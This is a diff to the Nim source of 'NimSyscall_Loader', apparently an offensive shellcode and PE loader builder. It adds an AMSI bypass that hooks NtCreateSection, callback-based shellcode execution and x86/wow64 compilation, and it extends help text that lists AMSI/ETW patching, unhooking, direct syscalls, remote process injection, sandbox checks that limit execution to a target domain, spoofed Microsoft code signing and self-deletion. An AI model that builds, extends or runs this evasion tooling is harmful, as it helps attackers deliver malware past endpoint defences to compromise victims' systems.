@@ -63,7 +63,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.7
 
 Usage:
-  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
+  NimSyscall_Loader [--file=file_to_encrypt --key=<key> --output=<output> --large --noRES --shellcodeFile=<shellcodeFile> --shellcodeURL=<shellcodeURL> --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --cpl --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --AMSINtCreateSectionHook --sleep=<10> --shellcode --CallbackExecute --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --wow64 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate --interactivePS]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -85,7 +85,8 @@ Options:
   --APIhide    Console won't pop up, hidden via API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'
   --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
   --debug    Compiles the binary in debug mode
-  --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
+  --x86    Compiles an x86 binary
+  --wow64    (Compiles a x86 binary that can be by x64 CPUs)
   --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
   --verbose    Prints output to the console (for troubleshooting purposes)
@@ -113,6 +114,7 @@ Options:
   --sgn    Encode shellcode via SGN before encrypting it´
   --replace    Replace common nim IoC's in the loader like the string 'nim'
   --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
+  --AMSINtCreateSectionHook    Hook NtCreateSection to prevent 'amsi.dll' from being loaded (https://waawaa.github.io/es/amsi_bypass-hooking-NtCreateSection/) -> Prevent Loading works, but C# Loading fails for some reason
   --sandbox value    Include Sandbox Checks of your choice into the loader:
                      Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                      DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
@@ -143,6 +145,7 @@ Options:
 [shellcode specific]
 
   --shellcode    Encrypt shellcode to load it on runtime
+  --CallbackExecute    Execute shellcode via a custom Callback function
   --localCreateThread    Use NtCreateThreadEx for local injection instead of a direct pointer to the shellcode
   --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
       --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
@@ -205,9 +208,11 @@ var
     embeddedArguments : bool = false
     AMSI: bool = true
     AMSIProviderPatch: bool = false
+    AMSICreateSectionHook: bool = false
     ETW: bool = true
     COMVARETW: bool = false
     shellcode: bool = true
+    callbackexecute: bool = false
     localCreateThread: bool = false
     localinject: bool = true
     unhook: bool = false
@@ -239,6 +244,7 @@ var
     sign: bool = false
     signdomain: string = "www.microsoft.com"
     compileX86: bool = false
+    wow64: bool = false
     noassembly: bool = false
     sleepycrypt: bool = false
     fluctuate: bool = false
@@ -266,6 +272,9 @@ if args["--shellcode"]:
   shellcode = true
   csharp = false
   peload = false
+
+if args["--CallbackExecute"]:
+  callbackexecute = true
 
 if args["--localCreateThread"]:
     localCreateThread = true
@@ -357,6 +366,10 @@ if args["--noAMSI"]:
 
 if args["--AMSIProviderPatch"]:
   AMSIProviderPatch = true
+  AMSI = false
+
+if args["--AMSINtCreateSectionHook"]:
+  AMSICreateSectionHook = true
   AMSI = false
 
 if args["--noETW"]:
@@ -473,6 +486,12 @@ if args["--antidebug"]:
 
 if args["--x86"]:
   compileX86 = true
+  noDInvoke = true # many bugs for x86 + DInvoke, investigation will take time.
+
+if args["--wow64"]:
+    wow64 = true
+    compileX86 = true
+    noDInvoke = true # many bugs for x86 + DInvoke, investigation will take time.
 
 if args["--verbose"]:
   verbose = true
@@ -1253,9 +1272,15 @@ if (getfreshstub):
 
 if (syswhispers):
     if(jump):
-        stub.add(WhispersJumpStub)
+        if (not compileX86):
+            stub.add(WhispersJumpStub)
+        else:
+            stub.add(WhispersJumpStubX86)
     else:
-        stub.add(WhispersStub)
+        if (not compileX86):
+            stub.add(WhispersStub)
+        else:
+            stub.add(WhispersStubX86)
 
 stub.add(getRandStub())
 
@@ -1318,6 +1343,8 @@ if (localinject):
         stub.add(AMSIStub)
     elif(AmsiProviderPatch):
         stub.add(AMSIProviderPatchStub)
+    elif(AMSICreateSectionHook):
+        stub.add(AMSINtCreateSectionHookStub)
     if (ETW):
         if (COMVARETW):
             stub.add(ETWCOMVARStub)
@@ -1563,6 +1590,8 @@ elif system.hostOS == "linux":
 if(denim):
     basicCompileFlags.add("-d:denim ")
 
+if(callbackexecute):
+    basicCompileFlags.add("-d:Callback ")
 
 if(hellsgate):
     basicCompileFlags.add("-d:Hellsgate ")
@@ -1583,7 +1612,7 @@ if embeddedArguments:
 if (big):
     basicCompileFlags.add("--maxLoopIterationsVM:1000000000 ")
 
-if (noRES):
+if (noRES and (not compileX86)): # compiled .o files only work for x64, didnt compile for x86 so far
     if (dll_out or cpl):
         when system.hostOS == "windows":
             basicCompileFlags.add(fmt"--passL:{packerPath}\\resource\\dll.o ")
@@ -1600,6 +1629,9 @@ if(fluctuate):
 
 if (compileX86):
     basicCompileFlags.add("--cpu:i386 ")
+
+if (wow64):
+    basicCompileFlags.add("-d:wow64 ")
 
 if not noDInvoke:
     basicCompileFlags.add("-d:DInvoke ")
